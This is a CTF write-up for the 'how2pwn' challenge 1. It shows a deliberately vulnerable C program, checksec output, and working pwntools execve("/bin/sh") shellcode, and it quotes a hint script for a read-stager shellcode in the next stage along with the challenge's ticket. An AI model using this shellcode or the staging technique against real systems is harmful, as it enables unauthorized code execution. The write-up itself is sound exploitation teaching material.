# how2pwn - Challenge 1

Categories: Pwn

**Tags:** pwn, shellcode, PIE shellcode

## Takeaways

- `execve("/bin/sh", ["/bin/sh", NULL], NULL)` shellcode
- Setting `al` does not clear the remaining upper bits of `rax`.
- PIE shellcode
- Use `hbreak` (hardware breakpoints) when dealing with shellcode, especially when you have self-modifying code or RWX regions.

## Solution

Let's take a look at the source code:

```c
#include <stdio.h>
#include <unistd.h>
void init(){
    // Set stdin/stdout unbuffered
    // So folks would not have io(input/output) issues
    fclose(stderr);
    setvbuf(stdin,  0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}
int main(){
    init();
    // A buffer is created to store your shellcode
    char buf[0x100]; 
    puts("Enter your shellcode: ");
    read(0, buf, 0x100);
    // A functioner point is defined and points to the buffer.
    void (* p )(); 
    p = (void (*)()) buf;
    // Let's run the shellcode
    p();
    return 0;
}
```

As it seems, this is a simple shellcode challenge. We have `0x100` bytes to write in a buffer at the stack which then gets executed. Let's verify that the stack is also indeed executable:

```bash
nikos@ctf-box:~/how2pwn$ checksec --file=./public/bin/all/chal1
[*] '~/how2pwn/public/bin/all/chal1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
nikos@ctf-box:~/how2pwn$ readelf --wide --segments ./public/bin/all/chal1 | grep -ie RWE
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10
```

Let's write our simple shellcode now using pwntools:

```python
def craft_shellcode():
    # invoke syscall:
    # execve("/bin/sh", ["/bin/sh", NULL], NULL);
    shellcode = asm('''
    xor     rdx, rdx
    lea rbx, [rip+binsh]
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    mov     eax, 0x3b
    syscall

    hang:
    jmp hang

    /************* Data section *************/
    binsh:
    .ascii "/bin/sh\\0"
    ''')
    padded_shellcode = shellcode + b'\x90'*(0x100 - len(shellcode)) # pad with NOPs
    assert(len(padded_shellcode) == 0x100)
    return padded_shellcode
```

Once we send our payload to the server, we are presented with the ticket and also a hint for the next challenge:

````bash
# Stage 1

Congrats(1/4)!

# Ticket
764fce03d863b5155db4af260374acc1

# Hints

```py
from pwn import *

p = process("./chal2")
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# For this challenge, your task is to get a shell with shorter shellcode: 0x10 bytes

# Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check these registers!

# Tip 2: The 0x10 bytes length limitation is too strict for execve("/bin/sh") cuz len("/bin/sh")==0x8. \
# Why don't we call read rather than execve \
# so we could read longer shellcode and execute "/bin/sh"

context.arch = 'amd64'
shellcode = f'''
short shellcode to read longer shellcode
'''
# gdb.attach(p)
shellcode = asm(shellcode)
print(len(shellcode))

p.sendafter(": \n",shellcode.ljust(0x10,b'\0'))

# If you sent proper shellcode which allows us to read longer shellcode,
# you can try the following code. It's an easier way to generate shellcode
# p.send(b"\x90"*len(shellcode)+asm(shellcraft.sh()))

p.interactive()
````

So the ticket is `764fce03d863b5155db4af260374acc1`
